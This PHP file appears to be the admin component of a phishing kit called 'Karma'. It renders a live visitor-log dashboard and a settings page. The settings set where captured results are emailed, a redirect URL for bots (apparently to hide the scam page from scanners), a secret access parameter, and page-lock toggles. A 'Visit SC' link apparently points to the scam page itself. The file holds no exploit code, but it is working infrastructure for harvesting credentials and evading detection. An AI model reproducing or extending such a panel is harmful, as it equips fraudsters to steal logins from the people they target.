<?php
function KarmaPanelPage() {
    $configFilePath = __DIR__ . '/../config/config.php';
    $visitorlogs = __DIR__ . '/../core/visit_log.jsonl';
    $config = include $configFilePath;

    $logs = [];

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['clear_logs'])) {
        file_put_contents($visitorlogs, '');
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }
?>
    <!DOCTYPE html>
        <html lang="en">
            <head>
                <meta charset="UTF-8">
                <title>Karma Admin Dashboard</title>
                <link rel="icon" href="/public/images/favicon.ico" />
                <link href="/public/css/karma-styles.css?v=<?= time(); ?>" rel="stylesheet">
                <link href="/public/css/karma-custom.css?v=<?= time(); ?>" rel="stylesheet">
            </head>
            <body class="bg-gradient-to-br from-indigo-50 to-white min-h-screen flex flex-col sf-pro-reg tracking-wide">
                <main class="flex-1 flex flex-col items-center justify-start py-10 px-4 cursor-default">
                    <div id="empty-state" class="flex items-center justify-center min-h-[500px] text-center transition-opacity duration-500">
                        <a href="/karmaxsettings" class="group block w-full h-full">
                            <svg class="w-30 h-30 group-hover:w-25 group-hover:h-25 transition-all transform duration-300 ease-in-out" viewBox="-5.3 -1792.9 8666.25 8666.25" clip-rule="evenodd" fill-rule="evenodd" image-rendering="optimizeQuality" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" xmlns="http://www.w3.org/2000/svg" fill="#000000"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="m5201.05 641.04c-13.53 3.96-17.03 10.03-30.44 21.5-10.8 9.23-19.91 15.78-30.39 24.8-23.98 20.65-38.04 33.42-59.13 51.15-104.65 88.04-246.64 225.21-349.23 321.27-159.15 149.02-302.58 292.53-455.26 440.74-287.94 279.51-614.24 615.13-902.44 884.6-238.17 222.69-442.45 422.69-691.34 645.32-95.12 85.08-155.04 162.58-284.55 167.06-213.73 7.38-495.66-174.55-639.84-257.27-125.99-72.28-460.62-269.07-621.94-274.53l118.19 162.36c84.51 128.95 226.6 409.82 294.84 546.49 234.45 469.54 550.96 961.22 953.8 1288.28 103 83.62 196.33 153.92 327.16 233.08 57.39 34.72 115.94 63.6 180.12 99.93 22.25 12.59 176.55 84.65 195.57 84.61-42.26-42.35-85.73-94.09-120.07-134.47-153.36-180.35-494.52-531.02-596.99-710-86.04-150.27-105.81-242.3-10.2-393.13 109.3-172.42 364.18-385.78 524.07-522.54 389.11-332.8 740.02-634.22 1147.14-950.19 192.9-149.71 393.46-302.43 600.91-450.46 203.51-145.21 408.06-285.1 620.51-425.53l320.79-204.14c29.76-17.07 321.94-191.02 326.61-196.85l285.9-157.72c96.02-54.24 189.26-99.52 290.94-154.28 298.37-160.67 890.92-422.55 1230.48-542.34 111.46-39.32 217.67-76.46 330.41-114.98l337.89-105.84c-27.34-14.06-400.68-17.93-469.46-17.94-276.82-.04-446.66 7.68-710.93 28.56-202.26 15.98-578.64 57.5-762.57 101.97-33.11 8-72.31 11.42-105.65 20.2-63.77 16.8-136.77 28.36-202.08 44.62-134.67 33.53-256.94 71.52-383.51 109.26-130.28 38.84-248.11 84.88-364.66 132.83-68.86 28.33-276.96 167.45-294.64 203.59zm2703.87 668.67 245.7-125.47c85.23-40.58 173.38-87.23 253.65-126.46 162.87-79.59 256.68-337.47 254.31-502.79-28.76 1.21-145.77 56.67-177.53 68.3-21.84 7.99-42 14.87-62.46 23.57-145.1 61.65-338.81 134.55-476.35 199.46-39.94 18.85-78.54 34.44-118.96 51.78-31.73 13.61-101.69 41.06-114.73 57.25-43.66-2.22-932.65 438.32-1043.46 495.62-157.77 81.58-356.17 179.36-507.81 263.73-17.96 9.99-480.25 254.66-498.67 278.22-30.44 5.08-347.32 193.25-397.89 221.79-627.03 353.81-1321.46 798.9-1922.06 1206.24-166.91 113.21-380.1 261.73-547.86 388.13l-134.66 100.52c-15.48 11.8-33.74 19.62-42.66 37.33 59.88 51.54 456.55 214.98 551.18 249.09 531.13 191.42 1028.25 324.79 1587.07 420.7l354.64 54.24 279.34 24.64-227.51-20.07c43.42 4.94 86.52 12 128.76 16.04 62.48 5.97 124.46 11.06 188.81 17.51 121.2 12.16 261.93 20.44 386.52 22.64 154.89 2.72 240.23 10.63 367.22-43 98.44-41.57 178.56-93.28 256.81-153.25 291.46-223.35 550.76-572.68 757.62-888.83 216.49-330.86 411.48-700.53 579.56-1066.77 85.61-186.53 165.92-381.15 241.55-579.41 38.33-100.49 71.57-197.54 106.19-304.17 19.17-59.03 88.92-274.54 94.23-322.69-79.51 10.86-1469.62 760.88-1601.89 831.89-179.39 96.31-351.17 196.63-525.22 291.16-169.14 91.87-348.06 200.44-516.36 293.98-341.95 190.05-686.31 401.75-1027.78 599.46-58.55 33.9-493.37 288.09-508.99 305.96 29.23-4.69 1407.81-596.72 1441.19-610.51 65.01-26.88 1418.57-607.72 1440.77-608.69-7.78 31.3-91.56 187.71-112.71 233.68-35.24 76.6-77.73 163.78-116.24 239.96-218.27 431.79-455.16 950.26-931.72 1141.65l-28.63 17.19c-25.54.58-95.31 28.94-126.08 37.39-46.32 12.72-91.09 21.55-137.78 31.11-219.65 44.98-551.71 21.53-780.61-14.28-261.02-40.84-443.79-86.66-696.8-147.82-60.4-14.6-496.94-137.23-522.16-153.89 14.22-24.79 263.88-184.77 285.73-199.95 483.07-335.77 1285.47-829.17 1807.31-1126.07 55.23-31.43 106.56-59.98 157.06-88.92 41.98-24.06 118.82-64.17 152.73-88.81l244.16-133.92c82.56-45.8 158.37-85.48 245.33-135.11 164.4-93.81 330.97-172.45 492.78-263.6 23.79-13.4 947.81-498.95 1005.34-515.74zm-6281.42 2534.49c-9.6-20.39-176.45-197.43-209.6-234.44-210.42-234.95-414.41-453.8-625.9-700.64-147.34-171.96-278.59-330.41-403.81-482.34-52.4-63.57-339.95-424.53-383.88-498.13-5.61 14.15 66.78 310.04 77.47 348.92 16.39 59.64 29.07 113.99 45.79 174.85 163.4 594.9 326.69 820.03 889.36 1107.54 69.31 35.41 573.16 279.12 610.57 284.24z" fill="#e50007"></path></g></svg>
                            <b class="opacity-0 group-hover:opacity-100 transition-opacity duration-300 text-xl">KARMA</b>
                        </a>
                    </div>

                    <div id="dashboard-content" class="w-full max-w-6xl hidden flex flex-col items-center justify-start gap-10">
                        <header class="w-full bg-transparent flex items-center justify-between px-5">
                            <div class="text-2xl font-bold text-stone-900">Karma</div>
                            <nav>
                                <a href="/karmaxsettings" class="text-stone-900/90 hover:text-[#f26631] transition duration-200 font-semibold">Settings</a>
                            </nav>
                        </header>
                        <div id="summary-container" class="w-full grid grid-cols-1 sm:grid-cols-2 md:grid-cols-5 gap-6 mb-10">
                            <!-- INFO LIVE -->
                        </div>
                        <div class="w-full rounded-2xl p-10 border-2 border-black/60 hover:border-green-500 bg-white shadow-md transition duration-200">
                            <div class="flex items-center justify-center mb-10">
                                <svg class="h-5 w-5 lg:w-10 lg:h-10" fill="#000000" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M18.71 19.5C17.88 20.74 17 21.95..."></path>
                                </svg>
                                <div id="clear-logs-container" class="flex items-center justify-between mb-2 hidden max-w-6xl mx-auto w-full">
                                    <svg class="w-16 h-16" viewBox="-5.3 -1792.9 8666.25 8666.25" clip-rule="evenodd" fill-rule="evenodd" image-rendering="optimizeQuality" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" xmlns="http://www.w3.org/2000/svg" fill="#000000"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="m5201.05 641.04c-13.53 3.96-17.03 10.03-30.44 21.5-10.8 9.23-19.91 15.78-30.39 24.8-23.98 20.65-38.04 33.42-59.13 51.15-104.65 88.04-246.64 225.21-349.23 321.27-159.15 149.02-302.58 292.53-455.26 440.74-287.94 279.51-614.24 615.13-902.44 884.6-238.17 222.69-442.45 422.69-691.34 645.32-95.12 85.08-155.04 162.58-284.55 167.06-213.73 7.38-495.66-174.55-639.84-257.27-125.99-72.28-460.62-269.07-621.94-274.53l118.19 162.36c84.51 128.95 226.6 409.82 294.84 546.49 234.45 469.54 550.96 961.22 953.8 1288.28 103 83.62 196.33 153.92 327.16 233.08 57.39 34.72 115.94 63.6 180.12 99.93 22.25 12.59 176.55 84.65 195.57 84.61-42.26-42.35-85.73-94.09-120.07-134.47-153.36-180.35-494.52-531.02-596.99-710-86.04-150.27-105.81-242.3-10.2-393.13 109.3-172.42 364.18-385.78 524.07-522.54 389.11-332.8 740.02-634.22 1147.14-950.19 192.9-149.71 393.46-302.43 600.91-450.46 203.51-145.21 408.06-285.1 620.51-425.53l320.79-204.14c29.76-17.07 321.94-191.02 326.61-196.85l285.9-157.72c96.02-54.24 189.26-99.52 290.94-154.28 298.37-160.67 890.92-422.55 1230.48-542.34 111.46-39.32 217.67-76.46 330.41-114.98l337.89-105.84c-27.34-14.06-400.68-17.93-469.46-17.94-276.82-.04-446.66 7.68-710.93 28.56-202.26 15.98-578.64 57.5-762.57 101.97-33.11 8-72.31 11.42-105.65 20.2-63.77 16.8-136.77 28.36-202.08 44.62-134.67 33.53-256.94 71.52-383.51 109.26-130.28 38.84-248.11 84.88-364.66 132.83-68.86 28.33-276.96 167.45-294.64 203.59zm2703.87 668.67 245.7-125.47c85.23-40.58 173.38-87.23 253.65-126.46 162.87-79.59 256.68-337.47 254.31-502.79-28.76 1.21-145.77 56.67-177.53 68.3-21.84 7.99-42 14.87-62.46 23.57-145.1 61.65-338.81 134.55-476.35 199.46-39.94 18.85-78.54 34.44-118.96 51.78-31.73 13.61-101.69 41.06-114.73 57.25-43.66-2.22-932.65 438.32-1043.46 495.62-157.77 81.58-356.17 179.36-507.81 263.73-17.96 9.99-480.25 254.66-498.67 278.22-30.44 5.08-347.32 193.25-397.89 221.79-627.03 353.81-1321.46 798.9-1922.06 1206.24-166.91 113.21-380.1 261.73-547.86 388.13l-134.66 100.52c-15.48 11.8-33.74 19.62-42.66 37.33 59.88 51.54 456.55 214.98 551.18 249.09 531.13 191.42 1028.25 324.79 1587.07 420.7l354.64 54.24 279.34 24.64-227.51-20.07c43.42 4.94 86.52 12 128.76 16.04 62.48 5.97 124.46 11.06 188.81 17.51 121.2 12.16 261.93 20.44 386.52 22.64 154.89 2.72 240.23 10.63 367.22-43 98.44-41.57 178.56-93.28 256.81-153.25 291.46-223.35 550.76-572.68 757.62-888.83 216.49-330.86 411.48-700.53 579.56-1066.77 85.61-186.53 165.92-381.15 241.55-579.41 38.33-100.49 71.57-197.54 106.19-304.17 19.17-59.03 88.92-274.54 94.23-322.69-79.51 10.86-1469.62 760.88-1601.89 831.89-179.39 96.31-351.17 196.63-525.22 291.16-169.14 91.87-348.06 200.44-516.36 293.98-341.95 190.05-686.31 401.75-1027.78 599.46-58.55 33.9-493.37 288.09-508.99 305.96 29.23-4.69 1407.81-596.72 1441.19-610.51 65.01-26.88 1418.57-607.72 1440.77-608.69-7.78 31.3-91.56 187.71-112.71 233.68-35.24 76.6-77.73 163.78-116.24 239.96-218.27 431.79-455.16 950.26-931.72 1141.65l-28.63 17.19c-25.54.58-95.31 28.94-126.08 37.39-46.32 12.72-91.09 21.55-137.78 31.11-219.65 44.98-551.71 21.53-780.61-14.28-261.02-40.84-443.79-86.66-696.8-147.82-60.4-14.6-496.94-137.23-522.16-153.89 14.22-24.79 263.88-184.77 285.73-199.95 483.07-335.77 1285.47-829.17 1807.31-1126.07 55.23-31.43 106.56-59.98 157.06-88.92 41.98-24.06 118.82-64.17 152.73-88.81l244.16-133.92c82.56-45.8 158.37-85.48 245.33-135.11 164.4-93.81 330.97-172.45 492.78-263.6 23.79-13.4 947.81-498.95 1005.34-515.74zm-6281.42 2534.49c-9.6-20.39-176.45-197.43-209.6-234.44-210.42-234.95-414.41-453.8-625.9-700.64-147.34-171.96-278.59-330.41-403.81-482.34-52.4-63.57-339.95-424.53-383.88-498.13-5.61 14.15 66.78 310.04 77.47 348.92 16.39 59.64 29.07 113.99 45.79 174.85 163.4 594.9 326.69 820.03 889.36 1107.54 69.31 35.41 573.16 279.12 610.57 284.24z" fill="#e50007"></path></g></svg>
                                    <form method="POST">
                                        <button type="submit" name="clear_logs" onclick="return confirm('YAKIN MAU CLEAR LOGS?');"
                                            class="text-stone-900/90 hover:text-[#f26631] transition duration-200 font-semibold cursor-pointer">
                                            Clear Logs
                                        </button>
                                    </form>
                                </div>
                            </div>
                            <div id="log-container" class="overflow-y-auto max-h-[500px] rounded-xl border border-gray-300 scrollbar-thin">
                                <!-- VISITOR LIVE -->
                            </div>
                        </div>
                    </div>
                </main>
                <script src="/[KARMA]/live/live.js?v=<?= time(); ?>"></script>
            </body>
        </html>
    <?php
}

function KarmaPanelSettingsPage() {
    $configFilePath = __DIR__ . '/../config/config.php';
    $config = include $configFilePath;
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $config['email_result'] = htmlspecialchars($_POST['email_result']);
        $config['parameter'] = htmlspecialchars($_POST['parameter']);
        $config['redirect_bots'] = htmlspecialchars($_POST['redirect_bots']);
        $config['email_akses_page'] = htmlspecialchars($_POST['email_akses_page']);
        $config['locked_page'] = htmlspecialchars($_POST['locked_page']);
        $newConfigContent = '<?php return ' . var_export($config, true) . ';';
        file_put_contents($configFilePath, $newConfigContent);
    }
    ?>
    <!DOCTYPE html>
        <html lang="en">
            <head>
                <meta charset="UTF-8">
                <title>Admin Config Panel</title>
                <link rel="icon" href="/public/images/favicon.ico" />
                <link href="/public/css/karma-styles.css?v=<?= time(); ?>" rel="stylesheet">
                <link href="/public/css/karma-custom.css?v=<?= time(); ?>" rel="stylesheet">
                <script src="/public/js/karma.js?v=<?= time(); ?>"></script>
            </head>
            <body class="bg-gradient-to-br from-indigo-50 to-white min-h-screen flex flex-col sf-pro-reg tracking-wide">
                <header class="w-full max-w-6xl mx-auto bg-transparent py-5 flex items-center justify-between px-5">
                    <div class="flex justify-center items-center gap-3">
                        <span class="text-xl lg:text-2xl font-bold text-stone-900/90">Karma</span>
                    </div>
                    <nav class="lg:flex lg:flex-row flex flex-col gap-2 lg:gap-6">
                        <a href="/karmaxcs" class="text-stone-900/90 hover:text-[#f26631] transition duration-200 font-semibold">Dashboard</a>
                        <a href="<?php echo "/?" . $config['parameter'] ?>" target="_blank" class="text-stone-900/90 hover:text-[#f26631] transition duration-200 font-semibold">Visit SC</a>
                    </nav>
                </header>
                <main class="flex-1 flex flex-col items-center justify-center py-10 px-5">
                    <div class="w-full max-w-2xl rounded-2xl p-10 border-2 border-black/60 hover:border-2 hover:border-green-500 transition duration-200">
                        <h2 class="text-3xl sf-pro-semibold text-center text-stone-900/90 mb-8 tracking-tight">Configuration Settings</h2>
                        <form method="POST" class="space-y-8">
                            <div class="flex flex-col md:flex-row md:items-end md:justify-between gap-2">
                                <div class="flex-1 min-w-0">
                                    <label for="email_result" class="font-semibold block text-xs text-gray-500 mb-1 px-2">Email Result</label>
                                    <input type="email" id="email_result" name="email_result" value="<?= $config['email_result']; ?>"
                                        class="block w-full px-4 py-2 border border-gray-300 rounded-xl shadow-sm focus:outline-none focus:ring-2 focus:ring-indigo-400 focus:border-indigo-500 text-base transition placeholder-gray-400 bg-gray-50"
                                        required placeholder="Enter result email address">
                                </div>
                                <div class="w-full md:w-[240px] flex flex-col">
                                    <label for="saved_email_result" class="font-semibold block text-xs text-gray-500 mb-1 px-2">Saved Email Result</label>
                                    <input id="saved_email_result" type="text" readonly disabled value="<?= $config['email_result']; ?>"
                                        class="block font-semibold w-full px-4 py-2 border border-green-600 rounded-xl bg-transparent text-green-600 text-base truncate cursor-not-allowed" />
                                </div>
                            </div>
                            <div class="flex flex-col md:flex-row md:items-end md:justify-between gap-2">
                                <div class="flex-1 min-w-0">
                                    <label for="parameter" class="font-semibold block text-xs text-gray-500 mb-1 px-2">Parameter</label>
                                    <input type="text" id="parameter" name="parameter" value="<?= $config['parameter']; ?>"
                                        class="block w-full px-4 py-2 border border-gray-300 rounded-xl shadow-sm focus:outline-none focus:ring-2 focus:ring-indigo-400 focus:border-indigo-500 text-base transition placeholder-gray-400 bg-gray-50"
                                        required placeholder="Enter parameter value">
                                </div>
                                <div class="w-full md:w-[240px] flex flex-col">
                                    <label for="saved_parameter" class="font-semibold block text-xs text-gray-500 mb-1 px-2">Saved Parameter</label>
                                    <input id="saved_parameter" type="text" readonly disabled value="<?= $config['parameter']; ?>"
                                        class="block font-semibold w-full px-4 py-2 border border-green-600 rounded-xl bg-transparent text-green-600 text-base truncate cursor-not-allowed" />
                                </div>
                            </div>
                            <div class="flex flex-col md:flex-row md:items-end md:justify-between gap-2">
                                <div class="flex-1 min-w-0">
                                    <label for="redirect_bots" class="font-semibold block text-xs text-gray-500 mb-1 px-2">Redirect Bots URL</label>
                                    <input type="url" id="redirect_bots" name="redirect_bots" value="<?= $config['redirect_bots']; ?>"
                                        class="block w-full px-4 py-2 border border-gray-300 rounded-xl shadow-sm focus:outline-none focus:ring-2 focus:ring-indigo-400 focus:border-indigo-500 text-base transition placeholder-gray-400 bg-gray-50"
                                        required placeholder="Enter redirect URL for bots">
                                </div>
                                <div class="w-full md:w-[240px] flex flex-col">
                                    <label for="saved_redirect_bots" class="font-semibold block text-xs text-gray-500 mb-1 px-2">Saved Redirect Bots URL</label>
                                    <input id="saved_redirect_bots" type="text" readonly disabled value="<?= $config['redirect_bots']; ?>"
                                        class="block font-semibold w-full px-4 py-2 border border-green-600 rounded-xl bg-transparent text-green-600 text-base truncate cursor-not-allowed" />
                                </div>
                            </div>
                            <div class="flex flex-col md:flex-row md:items-end md:justify-between gap-2">
                                <div class="flex-1 min-w-0">
                                    <label for="locked_page" class="font-semibold block text-xs text-gray-500 mb-1 px-2">
                                        Locked Page
                                    </label>
                                    <select id="locked_page" name="locked_page"
                                        class="block w-full px-4 py-2 border border-gray-300 rounded-xl shadow-sm focus:outline-none focus:ring-2 focus:ring-indigo-400 focus:border-indigo-500 text-base transition placeholder-gray-400 bg-gray-50"
                                        required>
                                        <option value="on" <?= $config['locked_page'] === 'on' ? 'selected' : '' ?>>On</option>
                                        <option value="off" <?= $config['locked_page'] === 'off' ? 'selected' : '' ?>>Off</option>
                                    </select>
                                </div>
                                <div class="w-full md:w-[240px] flex flex-col">
                                    <label for="saved_locked_page" class="font-semibold block text-xs text-gray-500 mb-1 px-2">Saved Email Akses Page</label>
                                    <input id="saved_locked_page" type="text" readonly disabled value="<?= $config['locked_page']; ?>"
                                        class="block font-semibold w-full px-4 py-2 border border-green-600 rounded-xl bg-transparent text-green-600 text-base truncate cursor-not-allowed" />
                                </div>
                            </div>
                            <div class="flex flex-col md:flex-row md:items-end md:justify-between gap-2">
                                <div class="flex-1 min-w-0">
                                    <label for="email_akses_page" class="font-semibold block text-xs text-gray-500 mb-1 px-2">
                                        Email Akses Page
                                    </label>
                                    <select id="email_akses_page" name="email_akses_page"
                                        class="block w-full px-4 py-2 border border-gray-300 rounded-xl shadow-sm focus:outline-none focus:ring-2 focus:ring-indigo-400 focus:border-indigo-500 text-base transition placeholder-gray-400 bg-gray-50"
                                        required>
                                        <option value="on" <?= $config['email_akses_page'] === 'on' ? 'selected' : '' ?>>On</option>
                                        <option value="off" <?= $config['email_akses_page'] === 'off' ? 'selected' : '' ?>>Off</option>
                                    </select>
                                </div>
                                <div class="w-full md:w-[240px] flex flex-col">
                                    <label for="saved_email_akses_page" class="font-semibold block text-xs text-gray-500 mb-1 px-2">Saved Email Akses Page</label>
                                    <input id="saved_email_akses_page" type="text" readonly disabled value="<?= $config['email_akses_page']; ?>"
                                        class="block font-semibold w-full px-4 py-2 border border-green-600 rounded-xl bg-transparent text-green-600 text-base truncate cursor-not-allowed" />
                                </div>
                            </div>
                            <div class="flex justify-center mt-8">
                                <button type="submit" class="cursor-pointer flex items-center justify-center h-9 w-full md:w-auto px-8 py-3 bg-[#f26631] text-white rounded-xl shadow-md hover:bg-[#dd521f] focus:outline-none focus:ring-2 focus:ring-indigo-400 transition tracking-wide">
                                    Update Config
                                </button>
                            </div>
                        </form>
                    </div>
                </main>
            </body>
        </html>
    <?php
}

?>
